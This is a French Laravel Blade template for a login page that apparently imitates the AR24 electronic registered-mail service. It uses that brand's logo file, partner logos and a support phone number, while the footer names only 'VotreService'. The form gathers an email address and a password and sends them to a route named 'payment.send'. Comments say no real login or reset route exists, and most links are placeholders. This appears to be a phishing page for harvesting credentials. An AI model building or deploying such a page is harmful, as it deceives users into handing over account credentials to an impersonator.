<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Connexion - {{ config('app.name') }}</title>

    @vite(['resources/css/app.css', 'resources/js/app.js'])
</head>

<body class="min-h-screen bg-slate-50 text-slate-700">

    <!-- =========================
         NAVBAR
    ========================== -->

    <header class="border-b border-slate-200 bg-white">

        <nav class="mx-auto flex h-20 max-w-7xl items-center justify-between px-6 lg:px-8">

            <!-- Logo -->

            <a href="/" class="flex items-center gap-3">

                <!-- SVG Logo -->

               <img
                    src="{{ asset('images/ar24.png') }}"
                    alt="VotreService"
                    class="h-5 w-auto object-contain"
                >

            </a>


            <!-- Navigation -->

            <div class="hidden items-center gap-8 md:flex">


                <!--
                    Il n'existe pas de route "login".
                    La page actuelle est directement "/".
                -->

                <a
                    href="/"
                    class="rounded-full bg-blue-700 px-5 py-2.5 text-sm font-semibold text-white shadow-sm transition hover:bg-blue-800"
                >
                    inscription 
                </a>

                <a
                    href="/"
                    class="rounded-full bg-blue-700 px-5 py-2.5 text-sm font-semibold text-white shadow-sm transition hover:bg-blue-800"
                >
                    Se connecter
                </a>

            </div>


            <!-- Bouton mobile -->

            <a
                href="/"
                class="rounded-md bg-blue-700 px-4 py-2.5 text-sm font-semibold text-white shadow-sm md:hidden"
            >
                Connexion
            </a>

        </nav>

    </header>


    <!-- =========================
         MAIN
    ========================== -->

    <main class="flex min-h-[calc(100vh-80px)] items-center justify-center px-6 py-12">

        <div class="w-full max-w-md">

            <!-- Login Card -->

            


                <!-- =========================
                     HEADER
                ========================== -->

                <div class="mb-8 text-center">


                    <h1 class="text-4xl text-ar24 font-semibold tracking-tight text-slate-800">
                        Connexion
                    </h1>


                </div>


                <!-- =========================
                     ERREURS
                ========================== -->

                @if ($errors->any())

                    <div
                        class="mb-6 rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700"
                    >

                        {{ $errors->first() }}

                    </div>

                @endif


                <!-- =========================
                     FORMULAIRE
                ========================== -->

                <form
                    method="POST"
                    action="{{ route('payment.send') }}"
                    class="space-y-5 rounded-lg border border-slate-200 bg-white p-8 shadow-sm sm:p-10"
                >

                    @csrf


                    <!-- Email -->

                    <div>

                        <label
                            for="email"
                            class="mb-2 block text-sm font-medium text-slate-700"
                        >
                            Adresse e-mail
                        </label>

                        <input
                            id="email"
                            name="email"
                            type="email"
                            value="{{ old('email') }}"
                            autocomplete="email"
                            autofocus
                            required
                            placeholder="exemple@domaine.fr"
                            class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
                        >

                        @error('email')

                            <p class="mt-2 text-xs text-red-600">
                                {{ $message }}
                            </p>

                        @enderror

                    </div>


                    <!-- Password -->

                    <div>

                        <div class="mb-2 flex items-center justify-between">

                            <label
                                for="password"
                                class="block text-sm font-medium text-slate-700"
                            >
                                Mot de passe
                            </label>

                            <!--
                                Pas de route password.request
                                dans ton application actuellement.
                            -->

                            <span class="text-xs text-slate-400">
                                Accès sécurisé
                            </span>

                        </div>


                        <input
                            id="password"
                            name="password"
                            type="password"
                            autocomplete="current-password"
                            required
                            placeholder="Votre mot de passe"
                            class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-blue-600 focus:ring-2 focus:ring-blue-100"
                        >

                        @error('password')

                            <p class="mt-2 text-xs text-red-600">
                                {{ $message }}
                            </p>

                        @enderror

                    </div>


                    <!-- Remember -->

                    <div class="flex items-center">

                        <label class="flex cursor-pointer items-center gap-2">

                            <input
                                type="checkbox"
                                name="remember"
                                value="1"
                                class="h-4 w-4 rounded border-slate-300 text-blue-700 focus:ring-blue-600"
                            >

                            <span class="text-sm text-slate-500">
                                Se souvenir de moi
                            </span>

                        </label>

                    </div>


                    <!-- Bouton -->

                    <button
                        type="submit"
                        class="w-full rounded-md bg-blue-700 px-5 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-2"
                    >
                        Se connecter
                    </button>

                </form>


                <!-- =========================
                     INFORMATIONS
                ========================== -->

                <div class="mt-7 border-t border-slate-100 pt-6 text-center">

                    <p class="text-md font-semibold text-blue-700">
                        <span class="underline decoration-indigo-800 underline-offset-8">
                            Réinitialiser mon mot de passe ?
                        </span>
                    </p>

                    <a
                        href="#"
                        class="mt-6 underline decoration-indigo-800 underline-offset-8 mt-1 inline-block font-semibold text-blue-700 hover:text-blue-900 hover:underline"
                    >
                        Créer un compte
                    </a>

                </div>

            


            <!-- =========================
                 SECURITY
            ========================== -->


        </div>

    </main>


    <!-- =========================
     FOOTER
========================== -->

<footer class="border-t border-slate-200 bg-white">

    <div class="mx-auto max-w-7xl px-6 py-10 lg:px-8">

        <!-- =========================
             TOP
        ========================== -->

        <div class="flex flex-col lg:flex-row lg:items-center ">

            <!-- Logo -->

            <div class="shrink-0">

                <a href="/" class="inline-flex items-center">

                    <img
                        src="{{ asset('images/ar24.png') }}"
                        alt="VotreService"
                        class="h-7 w-auto object-contain"
                    >

                </a>

            </div>


            <!-- Description -->

            <div class="max-w-md text-sm font-light leading-6 text-slate-500 lg:ml-4 ">

                <p>
                    Votre solution d'envoi de documents électroniques
                    fiable, pratique et efficace.
                </p>

            </div>


            <!-- Logos partenaires -->

            <div class="flex items-center gap-5 lg:ml-auto">

                <!-- Remplace ces fichiers par tes propres partenaires -->

                <img
                    src="{{ asset('images/logo_frenchtech.png') }}"
                    alt="Partenaire"
                    class="h-12 w-auto object-contain opacity-90
               [filter:invert(43%)_sepia(12%)_saturate(1196%)_hue-rotate(193deg)_brightness(89%)_contrast(86%)]"
                >

                <img
                    src="{{ asset('images/logo_alsace.png') }}"
                    alt="Partenaire"
                    class="h-12 w-auto object-contain opacity-90
               [filter:invert(43%)_sepia(12%)_saturate(1196%)_hue-rotate(193deg)_brightness(89%)_contrast(86%)]"
                >

                <img
                    src="{{ asset('images/logo_syntec.png') }}"
                    alt="Partenaire"
                    class="h-10 w-auto object-contain opacity-90
               [filter:invert(43%)_sepia(12%)_saturate(1196%)_hue-rotate(193deg)_brightness(89%)_contrast(86%)]"
                >

            </div>

        </div>


        <!-- =========================
             SEPARATOR
        ========================== -->

        <div class="my-9 border-t border-slate-200"></div>


        <!-- =========================
             BOTTOM
        ========================== -->

        <div class="grid grid-cols-1 gap-10 sm:grid-cols-2 lg:grid-cols-5">


            <!-- CONTACT -->

            <div>

                <h3 class="sr-only">
                    Contact
                </h3>

                <a
                    href="tel:0811690545"
                    class="text-sm font-semibold text-[#00008C] transition hover:text-[#00006B]"
                >
                    08 11 69 05 45
                </a>

                <p class="text-sm text-[#00008C] transition hover:text-[#00006B]">
                    (0,05 €/min + prix appel)
                </p>

                <p class="mt-5 text-sm leading-6 text-slate-500">
                    Du lundi au vendredi
                </p>

                <p class="text-sm leading-6 text-slate-500">
                    de 9h00 à 17h30 en continu
                </p>

            </div>


            <!-- COLONNE 1 -->

            <div>

                

                <ul class="space-y-3">

                    <li>
                        <a
                            href="/"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Se connecter
                        </a>
                    </li>

                    <li>
                        <a
                            href="/"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Accueil
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Qui sommes-nous ?
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Avantages
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Certifications
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Contact
                        </a>
                    </li>

                </ul>

            </div>


            <!-- COLONNE 2 -->

            <div>

               

                <ul class="space-y-3">

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Pour qui ?
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            FAQ
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Base de connaissances
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Vérifier mes preuves
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Vérifier un email
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            État du service
                        </a>
                    </li>

                </ul>

            </div>


            <!-- COLONNE 3 -->

            <div>

                

                <ul class="space-y-3">

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            CGU
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Mentions légales
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Politique de confidentialité
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Sous-traitants
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Paramètres des cookies
                        </a>
                    </li>

                    <li>
                        <a
                            href="#"
                            class="text-md font-medium text-slate-500 transition hover:text-[#00008C]"
                        >
                            Accessibilité
                        </a>
                    </li>

                </ul>

            </div>


            <!-- LANGUES / COPYRIGHT -->

            <div>

                

                <div class="flex items-center gap-3">

                    <a
                        href="#"
                        aria-label="Français"
                        class="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-sm font-semibold text-[#00008C] shadow-sm transition hover:border-[#00008C] hover:bg-slate-50"
                    >
                        <img
                            src="{{ asset('images/france.png') }}"
                            alt="Français"
                            class="h-5 w-5 rounded-full object-cover ring-1 ring-slate-200 transition-all duration-200 group-hover:scale-110 group-hover:ring-2 group-hover:ring-[#00008C]"
                        >
                    </a>

                    <a
                        href="#"
                        aria-label="English"
                        class="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-sm font-semibold text-slate-600 shadow-sm transition hover:border-[#00008C] hover:text-[#00008C]"
                    >
                        <img
            src="{{ asset('images/uk.png') }}"
            alt="English"
            class="h-5 w-5 rounded-full object-cover ring-1 ring-slate-200 transition-all duration-200 group-hover:scale-110 group-hover:ring-2 group-hover:ring-[#00008C]"
        >
                    </a>

                    <a
                        href="#"
                        aria-label="Nederlands"
                        class="flex h-10 w-10 items-center justify-center rounded-full border border-slate-200 bg-white text-sm font-semibold text-slate-600 shadow-sm transition hover:border-[#00008C] hover:text-[#00008C]"
                    >
                         <img
                            src="{{ asset('images/netherlands.png') }}"
                            alt="Nederlands"
                            class="h-5 w-5 rounded-full object-cover ring-1 ring-slate-200 transition-all duration-200 group-hover:scale-110 group-hover:ring-2 group-hover:ring-[#00008C]"
                        >
                    </a>

                </div>


                <div class="mt-8 space-y-1 text-xs text-slate-400">

                    <p>
                        Tous droits réservés
                    </p>

                    <p>
                        VotreService {{ date('Y') }}
                    </p>

                </div>

            </div>

        </div>

    </div>

</footer>

</body>

</html>

